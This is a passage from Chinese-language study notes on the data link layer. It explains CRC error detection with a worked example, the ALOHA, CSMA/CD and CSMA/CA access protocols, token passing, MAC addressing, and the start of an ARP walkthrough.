<p>可以看到第二行第二列的0变为了1，这就会导致第i+1行第二列、第二行第j+1列的数都发生变化，因此就能够找到出错的bit了（交叉的地方）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220608164316.png" /></p>
<h2 id="校验和">2.2. 校验和</h2>
<p>校验和在传输层说UDP的时候提到了[[第3章 传输层#3 1 UDP校验和
checksum]]，这里不再多说。</p>
<p>只是想说明一点：校验和的方式可靠性不如CRC，因为EDC字段不算长（16bits），但因为这一班用于高层，也就是利用软件实现的，如果采用CRC，时间代价比较大。所以传输层采用校验和。</p>
<h2 id="循环冗余检测">2.3. 循环冗余检测</h2>
<h3 id="原理">2.3.1. 原理</h3>
<p>循环冗余检测 Cyclic Redundancy Check， CRC：</p>
<ul>
<li>强大的差错检测码</li>
<li>生成多项式G：双方协商的r+1位，<strong>首位必须为1</strong>(r+1位正好可以生成r位的R)
<ul>
<li>生成和检查所使用的位模式</li>
</ul></li>
<li>目标：选择r为的CRC附加为 R，使得
<ul>
<li>&lt;D,R&gt; 正好被G整除（模2）</li>
<li>接收方知道G，将 &lt;D,R&gt; 除以G，如果得到非0余数，检查出错误</li>
<li>能检出所有少于 r+1 位的错误</li>
</ul></li>
<li>CRC一般由硬件直接生成，因此计算速度很快</li>
</ul>
<blockquote>
<p>&lt;D,R&gt; 表示高位是D，低位是R</p>
</blockquote>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220608165611.png" /></p>
<p>求R的过程如下：</p>
<ol type="1">
<li><p>我们最终需要的是 &lt;D,R&gt; ，且能够被G整除，即 &lt;D,R&gt; =
nG。</p></li>
<li><p>&lt;D,R&gt; 等价于 <span class="math inline">\(D \cdot 2^r
\bigoplus R\)</span> ，因此 &lt;D,R&gt; = nG 等价于 <span
class="math inline">\(D \cdot 2^r \bigoplus R = nG\)</span></p></li>
<li><p>两边同时异或R，得到 <span class="math inline">\(D \cdot 2^r = nG
\bigoplus R\)</span></p></li>
<li><p>因为 nG
能被G整除，因此，两边同时除以G取余，右边得到的就是R。所以最后的公式为：（remainder表示取余）<span
class="math display">\[R=remainder[\frac {D \cdot 2^r}G ]\]</span>
介绍一下模2除法：除了不借位之外，还有3个原则：</p></li>
<li><p>除数与被除数最高几位异或（除数首位为1），得到商 1</p></li>
<li><p>得到的余数去掉首位（最高位，此时首位必为0）。然后看余数的最高位，如果是1，则继续模2除，商1；如果此时的余数最高位为0，则商0，重复步骤2</p></li>
<li><p>直到余数位数小于除数位数时，运算结束</p></li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220608172528.png" /></p>
<p>熟悉规则之后，可以直接把余数高位得到的0全部去掉，直到遇到第一个1。并且如果商为0不用写过程，直接把对应位后一位的数抄下去（对于被除数来说，下图中商为0的位为第5位，直接把第6位的数抄到余数的后面即可）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220608172616.png" /></p>
<h3 id="例子">2.3.2. 例子</h3>
<p><strong>（发送方）</strong></p>
<p>假设需要发送的D为 101110，生成多项式G（r+1位）为 1001
（在数学上可以看成 <span class="math inline">\(G=1 \cdot x^3 + 0 \cdot
x^2 + 0 \cdot x^1 + 1 \cdot x^0\)</span>），生成R的步骤如下：</p>
<ol type="1">
<li><p><span class="math inline">\(D \cdot 2^r = 101110
000\)</span></p></li>
<li><p>通过公式求R，计算过程见下图</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220608171005.png" /></p></li>
</ol>
<p>因为生成多项式是4位，因此CRC是3位，所以要在最后面补上0。中间的减法是模2运算，不借位。</p>
<p>因此，发送方发送的&lt;D,R&gt; = 101110011。</p>
<p><strong>（接收方）</strong></p>
<p>将 10110011 与G进行模2除法，过程如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220608173344.png" /></p>
<p>余数为0表示没有检测到错误。</p>
<h3 id="性能分析">2.3.3. 性能分析</h3>
<ol type="1">
<li>能够检查出所有长度小于 r+1 位的错误</li>
<li>出现长度为 r+1 的错误，检查不出的概率为 <span
class="math display">\[\frac 1{2^{r-1}}\]</span></li>
<li>出现长度大于 r+1 的错误，检查不出的概率为 <span
class="math display">\[\frac 1{2^r}\]</span></li>
</ol>
<h1 id="多点访问协议">3. 多点访问协议</h1>
<p>上面说了，如果采用多点连接的方式，那么2个或多个站点同时发送就会产生：冲突(collision)</p>
<ul>
<li>冲突：多个节点在同一个时刻发送（或者发送时间相差比较短），则会收到2个或多个信号的叠加</li>
</ul>
<p>因此需要解决该问题，这就是多路访问协议（介质访问控制协议：Medium
Access Control Protocol, MAC）</p>
<ul>
<li>采用分布式算法决定节点如何使用共享信道，即：决定节点什么时候发送</li>
<li>关于共享的信道，必须借助信道本身
<ul>
<li>传输控制信息以协调信道使用，没有带外信息用来发送控制信息</li>
<li>传输数据</li>
</ul></li>
</ul>
<p><strong>理想的</strong>MAC应该具有以下必要条件（假设共享信道为Rpbs）：</p>
<ol type="1">
<li>当一个节点发送数据时，以R速度发送</li>
<li>当M个节点发送时，（在一段时间内）每个节点可以获得 R/M
的平均速率（公平性）</li>
<li>应该是完全分布式的：
<ul>
<li>没有特殊的节点来协调发送（路由器和AP并不是协调发送的）</li>
<li>没有时钟和时隙的同步</li>
</ul></li>
<li>简单</li>
</ol>
<p>现在的MAC协议分为3大类：</p>
<ol type="1">
<li><strong>信道划分</strong>
<ul>
<li>把信道划分成小片</li>
<li>分配片给每个节点使用</li>
</ul></li>
<li><strong>随机访问</strong>
<ul>
<li>信道不划分，允许冲突</li>
<li>但是，冲突之后需要一定手段恢复</li>
</ul></li>
<li><strong>依次轮流</strong>（还可以细分为分布式和集中式）
<ul>
<li>节点一次轮流</li>
<li>有很多数据传输的节点可以获得较长的信道使用权</li>
</ul></li>
</ol>
<h2 id="信道划分">3.1. 信道划分</h2>
<p>有三种划分方式：</p>
<ol type="1">
<li>TDMA</li>
<li>FDMA</li>
<li>CDMA</li>
</ol>
<p>具体的原理在[[第1章 概论#6 1 1
电路交换中的多路复用]]中详细说过，这里就说一下不同方式的特点。</p>
<p>TDMA：</p>
<ul>
<li><p>轮流使用信道</p></li>
<li><p>每个站点使用每周期中的固定的时隙（时隙长度=帧传输时间）</p></li>
<li><p>如果站点没有帧传输，那么时隙就会被浪费。下图中2，5，6的时隙就被浪费了</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609092740.png" /></p></li>
</ul>
<p>FDMA：</p>
<ul>
<li><p>信道的有效频率范围被分成一个个小的频段</p></li>
<li><p>每个站点被分配一个固定的频段</p></li>
<li><p>站点如果没有帧传输，那么频段浪费。下图中2，5，6的频段就被浪费了</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609092914.png" /></p></li>
</ul>
<p>CDMA：</p>
<ul>
<li>所有站点在整个频段上同时进行传输，采用编码原理加以区分</li>
<li>完全无冲突</li>
<li>信号线性叠加</li>
</ul>
<h2 id="随机访问">3.2. 随机访问</h2>
<p>随机访问协议有以下特点：</p>
<ul>
<li>当节点有帧要发送时，用信道的全部带宽发送；没有节点间的预先协调</li>
<li>两个或更多节点同时传输，会发生冲突</li>
<li><strong>随机访问协议需要规定</strong>：
<ul>
<li><strong>如何检测冲突</strong>？</li>
<li><strong>如何从冲突中恢复</strong>？</li>
</ul></li>
<li>随机MAC协议有：
<ol type="1">
<li>时隙ALOHA</li>
<li>ALOHA</li>
<li>CSMA，CSMA/CD，CSMA/CD</li>
</ol></li>
</ul>
<h3 id="时隙aloha">3.2.1. 时隙ALOHA</h3>
<blockquote>
<p>最简单的解决办法，从信道划分的方法上演变而来</p>
</blockquote>
<p>该协议：</p>
<ul>
<li>假定所有帧的长度相等</li>
<li>时间被划分成相等的时隙，每个时隙可以发送一个帧</li>
<li><strong>节点只在时隙开始时发送</strong></li>
<li>节点在时钟上同步</li>
<li>如果两个或多个节点在同一个时隙中传输，所有的节点都能检测到冲突</li>
</ul>
<p>在该协议下工作的节点：</p>
<ol type="1">
<li>当节点需要传输帧的时候，需要在下一个时隙的开始时刻发送</li>
<li>传输时没有检测到冲突，则帧发送成功。冲突发生只有一种情况，那就是在时隙的一开始就冲突，在时隙的过程中不会产生冲突。因此，一开始没有检测到冲突，那就是没有冲突</li>
<li>传输时如果有检测到冲突，失败。<strong>节点在随后的每一个时隙以概率p进行重传，直到帧成功</strong></li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609093754.png" /></p>
<p>（C：collision，E：empty，S：success）</p>
<ol type="1">
<li>第1个时隙：3个节点同时发送，发生冲突。在随后的时隙中以概率p重传</li>
<li>第2个时隙：1，2节点选择重传，3不重传，仍然冲突。</li>
<li>第3个时隙：1，3选择不重传，2重传成功</li>
<li>第4个时隙：1，3都选择不重传，没有冲突，但是时隙浪费</li>
<li>第5个时隙：1，3都选择重传，冲突</li>
<li>第6个时隙：1，3都选择不重传，没有冲突，但是时隙浪费</li>
<li>第7个时隙：3不重传，1重传成功</li>
<li>第8个时隙：3重传成功</li>
</ol>
<p>从面的例子中可以看出，时隙ALOHA的优点有：</p>
<ol type="1">
<li>节点可以用信道的全部带宽发送</li>
<li>高度分布：仅需要节点之间在时隙上的同步</li>
<li>简单</li>
</ol>
<p>但是缺点也很明显：</p>
<ol type="1">
<li>存在冲突 -&gt; 浪费时隙</li>
<li>即使不存在冲突也可能浪费时隙（时隙4，6）</li>
<li>需要时钟同步</li>
<li>节点检测到冲突的时间 &lt;
帧传输的时间。但是即使检测到冲突，还需要把帧传输完（吃苹果，第一口坏的，还要把它吃完！！！）</li>
</ol>
<p>接下来计算以下该方法的效率，也就是信道利用率。计算的是帧成功传输的时隙，冲突和空的时隙都属于浪费。</p>
<p>假设有N个节点，每个节点都有很多帧要发送，每个节点在每个时隙中的传输概率都是p，并且与重传的概率p一致。那么：</p>
<ul>
<li>一个节点成功传输的概率 = <span
class="math inline">\(p(1-p)^{N-1}\)</span></li>
<li>任何一个节点成功传输的概率 = <span class="math inline">\(C_N^1 \cdot
p(1-p)^{N-1}\)</span></li>
</ul>
<p>因此得到一个公式 <span
class="math inline">\(f(p)=Np(1-p)^{N-1}\)</span> ，将其求导使 <span
class="math inline">\(f&#39;(p)=0\)</span> ,当N趋于无穷时，求得 <span
class="math inline">\(p=1/e=0.37\)</span>。故信道利用率为 37%</p>
<h3 id="aloha">3.2.2. ALOHA</h3>
<blockquote>
<p>时隙ALOHA的时隙容易浪费，最好的办法就是没有时隙，只要信道空闲，只要有数据就传输。但是ALOAH只做到了只要有数据就传输。</p>
</blockquote>
<ul>
<li>没有时隙的概念</li>
<li>简单，无需节点间在时间是同步（无需时隙同步）</li>
<li><strong>当有帧传输时，马上就传输</strong></li>
<li>上一点就会导致冲突的概率增加</li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609094935.png" /></p>
<p>假设我们发送的帧为黄色的，那么可能与绿色的冲突，也可嫩关于紫色的冲突。这是时隙ALOHA中不会发生的情况。</p>
<p>ALOHA情况下，我们发送的区间内可能：上一个区间的发送还没结束，又有新的发送开始；而时隙ALOHA情况下，只有两个同时发送的情况（可以类比为上一个区间的发送没结束）。因此，ALOHA的冲突概率时时隙ALOHA的两倍。</p>
$$
<span class="math display">\[\begin{aligned}
P(指定节点成功) &amp; =P(节点传输) \cdot P(其他节点在[t_0-1,t_0]不传)
\cdot p(其他节点在[t_0,t_0+1]不传) \\
&amp; = p \cdot (1-p)^{N-1} \cdot (1-p)^{N-1} \\
&amp; = \frac 1{2e} \\
&amp; = 17.5\% \qquad (N趋于无穷)

\end{aligned}\]</span>
<p>$$</p>
<h3 id="csma">3.2.3. CSMA</h3>
<p>CSMA: Carrier-sense multiple access 载波侦听多路访问。</p>
<p>在ALOHA的基础上，做到“只要空闲信道，那么有数据就发送”。ALOHA已经做到了后者，因此CSMA主要解决的就是前者，<strong>判断信道是否空闲</strong>。</p>
<p>CSMA，在传输之前先侦听信道：</p>
<ul>
<li>如果侦听到信道空闲，传送整个帧</li>
<li>如果侦听信道忙，推迟发送</li>
</ul>
<blockquote>
<p>侦听：帧在传输的时候会发送电磁波，监听电磁波即可</p>
</blockquote>
<p>但是这种方法不能保证冲突一定不发生，<strong>这是因为传播时延的存在</strong>。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609100507.png" /></p>
<p>见上图（从左到右依次为1，2，3，4主机）。</p>
<ol type="1">
<li>2号主机在t0时刻侦听信道空闲，所以发送数据（黄色）。</li>
<li>t1时刻，4号主机侦听信道，2号主机发送的电磁波还没到达4号主机（图中黑色虚线与黄色区域的交点就是2号主机电磁波到达的地方），所以4号主机侦听的结果是信道空闲，因此发送数据（红色）</li>
<li>在后面的某一时刻，红色和黄色交接，冲突发生，这时候2和4都不知道发生了冲突</li>
<li>过了一段时间后，4号主机和2号主机才先后知道冲突发生了（红色实现和红黄格子区域的交点）</li>
</ol>
<p>冲突发生后，整个冲突帧的传输时间都被浪费（红黄格子区域全部浪费）。为了减少这种情况发生的概率，就必须<strong>限制最大传播时延</strong>，因此LAN都会规定一个最远距离，即规定了LAN中最大的传播时延。</p>
<h3 id="csmacd">3.2.4. CSMA/CD</h3>
<blockquote>
<p>CSMA虽然一定程度上做到了“只要空闲信道，那么有数据就发送”，但是还是会发生冲突，冲突发生后如何恢复就是
CSMA/CD 的重点。</p>
</blockquote>
<p>CD：collision detection 冲突检测</p>
<p>CSMA/CD：</p>
<ul>
<li>在CSMA的基础之上</li>
<li>一边发送一边检测</li>
<li><strong>冲突发生时传输立即终止，减少对信道的浪费</strong></li>
<li><strong>二进制指数退避方法</strong></li>
<li>冲突检测技术通过检测信号强度（冲突会造成信号叠加，导致原本的信号和冲突时收到的信号不一致），在有线局域网中容易实现。有线的信号衰减小、噪声影响小，因此在不发生冲突的情况下信号基本一致</li>
</ul>
<p>以太网CSMA/CD算法：</p>
<ol type="1">
<li>适配器获取数据报，成帧</li>
<li>发送前：侦听信道CS
<ul>
<li>闲：开始发送帧</li>
<li>忙：等到空闲再发送</li>
</ul></li>
<li>发送过程中执行CD：
<ul>
<li>没有冲突：发送成功（也不一定[[#4 3 4 帧最小长度]]）</li>
<li>检测到冲突：立马放弃发送，之后尝试重发</li>
<li><strong>帧的最后一个bit发送之后，就不会再CD</strong></li>
</ul></li>
</ol>
<p>发送方检测到冲突之后，除了放弃之外，还需要发送一个Jam信号，所有听到冲突的适配器也是如此。因为有时候冲突信号持续比较短（两个相邻的节点同时发送产生冲突，此时冲突信号持续时间就比较短）<strong>Jam信号作用是强化冲突，让所有节点都知道发生了冲突</strong></p>
<p>适配器放弃之后，需要进入指数退避状态。即第k次失败之后，需要等到一段时间之后才可以再次回到步骤2。选择等待时间的算法称为二进制指数退避方法(exponential
backoff)。</p>
<p><strong>二进制指数退避方法的目标：对负载进行自适应，在一个变化的碰撞窗口中随机选择时间点尝试重发。</strong></p>
<ul>
<li>高负载：碰撞窗口大，随机选择的时间一样的概率减少，再次冲突的可能性减少，但是等待时间增加</li>
<li>低负载：碰撞窗口小，随机选择的时间一样的概率比较大，再次冲突的可能性比较大（但是因为低负载，因此可能性也没多大），等待时间比较少</li>
</ul>
<p>第k此碰撞之后的碰撞窗口为：<span
class="math inline">\([0,2^k-1]\)</span>：</p>
<ul>
<li>首次碰撞：k=1，窗口为 <span
class="math inline">\(\{0,1\}\)</span></li>
<li>第2次碰撞：k=2，窗口大小为 <span
class="math inline">\(\{0,1,2,3\}\)</span></li>
<li>第10次碰撞：k=10，窗口大小为 <span
class="math inline">\(\{0,1,2,3,4,...,1022,1023\}\)</span></li>
</ul>
<p>CSMA/CD的效率：</p>
<ul>
<li><span class="math inline">\(T_{prop}\)</span> =
LAN上2个节点的最大传播时延</li>
<li><span class="math inline">\(T_{trans}\)</span> =
传输最大帧的时间</li>
</ul>
<p><span class="math display">\[
efficiency = \frac 1{1+5\frac {T_{proc}}{T_{trans}}}
\]</span></p>
<p>当下面两个条件满足其一时，效率变成1：</p>
<ul>
<li>当 <span class="math inline">\(T_{prop}\)</span>
变成0，即两个节点无限接近，传播时延忽略不计。没有传输，哪里来的冲突</li>
<li>当 <span class="math inline">\(T_{trans}\)</span>
无限大时，即帧大小无限，虽然这是不太可能的。举个极端的例子，一个帧80T，那么接下来的一段时间其他节点等着吧，这段时间信道的利用率肯定是1，都用来传输这个巨无霸了</li>
</ul>
<p>比ALOHA更好的性能，而且简单、廉价、分布式。</p>
<h3 id="csmaca">3.2.5. CSMA/CA</h3>
<p>CA：collision avoidance 冲突避免。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609111610.png" /></p>
<p><strong>两个节点之间的通信，需要经过AP的转发。</strong></p>
<h4 id="无法使用cd">3.2.5.1. 无法使用CD</h4>
<p>首先解释一下为什么WLAN中无法使用CD，主要有两个原因：</p>
<p>第一个原因，发送天线和接收天线同时工作，因为信号衰减的原因，接收天线收到的信号（自己发送的和别人发送的）中，自己的发送信号强度远远大于别人发送的信号强度，即使冲突发生，冲突的信号也没有自己发送的信号强度大。因此检测不到。</p>
<p>第二个原因那就是在WLAN中，<strong>冲突是否发生和帧是否发送成功没有关系</strong>。</p>
<p>因为WLAN中会存在：隐藏终端</p>
<p><strong>隐藏终端的情况</strong>见下图：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609104035.png" /></p>
<p>A，C两个端互相收不到对方的信号（被物理隔绝），但是B（AP）能够收到A和C的信号。A发送帧给B的过程中，C检测信道发现信道空闲，因此也尝试发送帧给B。两个信号在B的周围发送了碰撞，但是碰撞信号也无法到达A和C，但是B知道。所以最后<strong>A和C没有检测到碰撞，但是帧的发送还是不成功</strong>。</p>
<p>其实采用CSMA/CA会导致：<strong>暴露终端的问题</strong>。即两个节点可以同时进行传输，但是因为检测到对方在发送而放弃自己的发送。虽然和不能使用CD没关系，但还是提一下。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609104734.png" /></p>
<p>红色：A的信号覆盖范围；绿色：B的信号覆盖范围；紫色：C的信号覆盖的范围；蓝色：D的信号覆盖的范围（A，C为两个AP或者接收方）</p>
<p>D发送帧给C，此时B可以检测到信号（快到大C的时候），假设这时候B向A发送帧，会产生冲突吗，并不会，因为B的信号到达C的时候衰减没了，因此B的信号能够成功到达A。但是这情况并不会发生，因为B检测到有信号的时候，就不会发送了。</p>
<h4 id="csmaca过程">3.2.5.2. CSMA/CA过程</h4>
<p>因为无法使用CD，所以只有在发送的时候小心一点，争取做到CA：</p>
<ul>
<li>一旦发送，就将帧全部发送，不CD</li>
<li>为了避免无CD带来的信道利用率低的问题看，发送前进行CA</li>
</ul>
<p><strong>（发送方）</strong></p>
<ol type="1">
<li>如果站点侦测到信道空闲持续DIFS的长度，则传输整个帧</li>
<li>如果侦测到信道忙，那么随机选择一个回退值（二进制指数退避方法），<strong>并在信道空闲时（每一个slot检测一次）递减该值</strong>，倒数到0时，发送整个帧。没有收到Ack的话（认为冲突发生），再次进行该步骤</li>
</ol>
<p><strong>（接收方）</strong></p>
<ol type="1">
<li>如果帧正确，则在SIFS之后发送Ack</li>
</ol>
<blockquote>
<p>CSMA/CD中就不需要Ack，因为没有检测到冲突就是发送成功。而CSMA/CA发送出去之后仍可能冲突，因此需要Ack来确保发送成功。</p>
</blockquote>
<p>这里面其实有一个问题，那就是都检测到信道空闲了为什么不发送，而是递减计数器，到0时才发送？</p>
<p>这是因为如果节点有N个，在某一时刻有1个节点在发送帧，其他N-1个节点检测到忙，等待一段时间，等到信道空闲了，N-1个节点都想着发送帧，所以没等到0就发送了，此时产生碰撞，之后的每一次都这样。又因为WLAN中一旦发送就发送完，所以冲突之后的代价比较大。</p>
<p>如果倒数到0才发送，因为退避窗口的存在，N个节点可能绝大部分选择的时间都不一样，小部分选择一样的，那么至少能保证选择不一样的时间的节点能把数据发送出去，而选择一样的再次退避。这样子碰撞的代价就小了。更好的情况就是所有节点的选择时间不一样，那么就能够使所有节点发送成功。</p>
<p>该方法其实不能完全避免冲突：</p>
<ol type="1">
<li>隐藏终端</li>
<li>选择的回退值一样</li>
</ol>
<p>这里的二进制指数退避方法与CSMA/CD不一样，这里的窗口大小为：<span
class="math inline">\([0,2^{k+1}]\)</span></p>
<h4 id="rtscts机制">3.2.5.3. RTS/CTS机制</h4>
<p>RTS/CTS: Request To Send/Clear To Send</p>
<p>思想：允许发送方“预约”信道，而不是随机访问信道，避免长数据帧的冲突（可选的机制）</p>
<p>工作流程如下：</p>
<ol type="1">
<li>发送方首先使用CSMA向AP发送一个小的RTS分组
<ul>
<li>RTS可能会冲突，但是比较短，浪费信道比较小</li>
</ul></li>
<li>AP广播
CTS，告诉所有人“接下来的一段时间不要发送了，有人要重要的事情和我说”，CTS作为RTS的响应</li>
<li>CTS能够被所有节点听到：
<ul>
<li>发送方听到，发送数据</li>
<li>其他节点听到，抑制发送</li>
</ul></li>
</ol>
<blockquote>
<p>采用小的预约分组，可以<strong>完全避免</strong>数据帧的冲突</p>
</blockquote>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609111505.png" /></p>
<h3 id="线缆接入网络">3.2.6. 线缆接入网络</h3>
<p>不是重点，稍微谈一点。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609113713.png" /></p>
<p>首先，将信道分为：上行信道和下行信道。上行信道还分成多个时隙，每几个时隙形成一个周期。在一个周期中，有的时隙是分配给用户使用的，有的时隙是需要预约的。</p>
<p>下行的情况下：</p>
<ul>
<li>只有一个CMTS(Cable Modem Termination
System)发送数据，因此不需要竞争，也没有冲突。但是需要在发送的帧的头部打上标记（MAC地址），表明接收方是谁。</li>
<li>需要告诉各节点他们预约的时隙是否成功。</li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609114235.png" /></p>
<p>上行的情况：</p>
<ul>
<li>节点采用分配的时隙进行上行数据传输（分配）</li>
<li>在特殊的上行时隙中，各节点预约该时隙，各站点对该时隙的使用是随机访问的（竞争），如果发生碰撞，那么CMTS没有未它们发配该时隙，下个周期还能竞争。如果没有发生碰撞，那么CMTS会通过下行的MAP帧告诉各节点“某某时隙被xx预约了”，预约成功之后，对应的节点就能使用预约的节点进行数据传输。</li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609114710.png" /></p>
<h2 id="轮流taking-turnsmac协议">3.3. 轮流(Taking Turns)MAC协议</h2>
<p>信道划分协议：共享信道在高负载时效率高，在低负载时效率低。</p>
<p>随机访问协议：低负载时效率高，高负载时效率低（一直碰撞）</p>
<p>轮流协议：结合了2者的优点，增加了新的缺点。</p>
<h3 id="集中式-轮询">3.3.1. 集中式-轮询</h3>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609115034.png" /></p>
<p><strong>工作流程：主节点依次邀请从节点发送数据，没得到邀请就不能够发送</strong></p>
<p>缺点：</p>
<ul>
<li>轮询开销：轮询本身需要消耗信道资源</li>
<li>等待时间：每个节点需要等待主节点的邀请才能够传输，下次传输需要等到轮询一周后</li>
<li>单点故障：主节点失效，即使从节点正常，整个系统也无法工作</li>
</ul>
<h3 id="分布式-令牌传递">3.3.2. 分布式-令牌传递</h3>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609115317.png" /></p>
<p>特点：</p>
<ul>
<li>控制令牌循环从一个节点到下一个节点传递</li>
<li>令牌报文是一个特殊的帧（某个字段为1表示令牌，为0表示数据帧）</li>
</ul>
<p>工作流程：</p>
<ol type="1">
<li>令牌一直在线路上循环。</li>
<li>令牌到达左边的主机，左边主机没有数据要发送，那么就不用管令牌</li>
<li>令牌到达下边的主机，下边的主机有数据要发送，那么会将令牌接收，然后将字段改为0，最后把数据接到令牌的后面，发送出去</li>
<li>接收方将“令牌+数据”接收之后，将数据保存，然后在某个字段中做标记（表示收到），如果有多个接收方，每个接收方都这么做。最后“令牌+数据”又到达发送方，发送方将数据清楚，令牌字段设置为1，再次将令牌放出来（即使再有数据也无法发送了）</li>
</ol>
<blockquote>
<p>为什么接收方不把数据和令牌都接收，然后重新放出令牌？因为可能存在多个接收方，如果前面的接收了，后面的就收不到了。再者，接收方发出的令牌会打乱原来的顺序，失去公平性。最后，发送方就不知道接收方收到没有。</p>
</blockquote>
<p>缺点：</p>
<ul>
<li>令牌开销</li>
<li>延迟：只有抓住令牌才能发送数据</li>
<li>单点故障：
<ul>
<li>令牌如果丢了整个系统GG</li>
<li>重新生成令牌的机制比较复杂（谁生成？谁弄丢了谁生成。那么怎么知道谁弄丢的？）</li>
</ul></li>
</ul>
<p><strong>因此，即使轮流协议不论在低负载还是高负载都有比较好的效率，但是不可靠，并且比较复杂。</strong></p>
<h2 id="mac协议总结">3.4. MAC协议总结</h2>
<p>信道划分：按时间、频率、编码等</p>
<p>随机访问：</p>
<ul>
<li>ALOHA，时隙ALOHA，CSMA，CSMA/CD，CSMA/CA</li>
<li>载波侦听：有线介质比较简单，无线介质比较困难</li>
<li>CSMA/CD：802.3 Ethernet网络中使用</li>
<li>CSMA/CA：802.11 WLAN中使用</li>
</ul>
<p>依次轮流：</p>
<ul>
<li>集中：有一个中心节点轮询</li>
<li>分布：通过令牌控制</li>
</ul>
<h1 id="lans">4. LANs</h1>
<h2 id="mac地址">4.1. MAC地址</h2>
<p>之前介绍过IP地址：</p>
<ul>
<li>32bits</li>
<li>网络层使用的地址</li>
<li>前n-1跳：用于使分组到达目的IP子网（网络号起作用）</li>
<li>最后一跳：到达子网中的目标节点（主机号起作用）</li>
</ul>
<p>LAN（MAC/物理/以太网）地址：</p>
<ul>
<li>用于使帧从一个网卡传递到与其物理连接的另一个网卡（同一物理网络中）</li>
<li>48bits MAC地址写死在适配器的ROM中</li>
<li>理论上任何2个网卡的MAC地址都不相同</li>
</ul>
<p><strong>IP地址和MAC地址作用是不同的。</strong></p>
<ul>
<li>IP地址是<strong>分层的</strong>
<ul>
<li>一个子网所有站点网络号一致，路由聚集，减少路由表表项。</li>
<li>IP地址主要作用是让分组从一个子网穿越多个子网到达目的子网</li>
<li>希望网络层地址是可以被配置的。如果把IP也写死在网卡上是很麻烦的，比如美国生产的网卡IP地址应该写什么？假设写了某个网络的IP，结果这张网卡被中国买走了该怎么办？</li>
</ul></li>
<li>MAC地址是<strong>平面的</strong>
<ul>
<li>网卡在生产的时候不知道会被用于哪个网络，因此给网卡一个唯一的标识，用于区分一个子网内部不同的网卡即可</li>
<li>可以完成一个子网内部的节点到节点的数据交付</li>
</ul></li>
</ul>
<p>网络地址和MAC地址分离是有诸多好处的：</p>
<ol type="1">
<li>网卡坏了，IP地址不变，再买一个网卡就可以了，不需要任何其他配置</li>
<li>可以支持除了IP之外的其他网络层协议</li>
</ol>
<p>如果将网络地址和MAC地址捆绑，则会：</p>
<ol type="1">
<li>如果仅仅使用IP地址，不适用MAC地址，那么它仅支持IP</li>
<li>每次上电都要重新写入IP地址。网卡坏了IP地址也得跟着换（如果是一个服务器，那么需要修改许多的配置信息）</li>
</ol>
<p>因此，实际的网络采用的就是网络地址和MAC地址分离的办法。既然二者分离了，那么如何将网络地址（假如是IP地址）和MAC地址对上呢？</p>
<p>A知道B的IP，需要发送一个帧给B，但是不知道B的MAC地址就没法成帧（需要源MAC和目标MAC）。如果不写入目标MAC，直接使用IP地址发送出去，即使B收到了这个帧，链路层在检查目标MAC地址的时候发现地址不对，那它该收下这个帧还是丢弃呢？</p>
<p>还有一种情况，假设多个主机连在一个交换机（二层设备）上，A发给B的帧里面没有MAC地址，那么交换机需要怎么知道这个帧的目标是谁呢？交换机又不理解网络层的IP。</p>
<p>ARP协议的出现就是来解决IP地址和MAC地址的映射关系。</p>
<h2 id="address-resolution-protocolarp">4.2. Address Resolution
Protocol(ARP)</h2>
<blockquote>
<p>需要注意，ARP工作在网络层</p>
</blockquote>
<blockquote>
<p>路由表上面除了IP地址，下一跳，代价等信息，也包括了下一跳对应的MAC地址。</p>
</blockquote>
<p>首先，LAN上的每个IP节点都有一个ARP表。ARP表包括同一个LAN内<strong>一些其他节点</strong>的IP/MAC地址映射关系，以及映射关系的TTL。
<code>&lt;IP address, MAC address, TTL&gt;</code></p>
<p>TTL时间指地址映射关系失效的时间，一般为20min。</p>
<p><strong>需要强调，ARP工作在同一个子网中</strong>。工作流程如下：</p>
<ul>
<li>A发送帧给B，只知道IP地址，不知道MAC地址，并且A的ARP表中也没有对应的映射关系</li>
<li>A首先<strong>广播</strong>包含B的IP地址的ARP查询包
<ul>
<li>查询包中，目标MAC地址设置为：<code>FF-FF-FF-FF-FF-FF</code>，源MAC地址是A的MAC地址</li>
<li>子网中的所有节点都会收到这个查询包</li>
</ul></li>
<li>B接收到这个查询包，对比自己的IP地址和包中的IP地址，发现匹配。将会发送一个帧给A，告诉A自己的MAC地址。该帧中的目标MAC地址是A的MAC地址</li>
<li>A收到B发的帧，将MAC地址填入要发送的帧中，然后发送。除此之外，还会将B的IP和MAC地址映射关系写入自己的ARP表</li>
</ul>
<p>ARP是即插即用的，节点自己创建ARP表项，无需网络管理员的干预。</p>
<p>下面的例子简单的说明了不同子网的两个主机的通信过程，以及ARP在其中的作用。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609144521.png" /></p>
<p>A要发送分组给B，A知道B的IP地址，不知道B的MAC地址。步骤如下：</p>
<ol type="1">
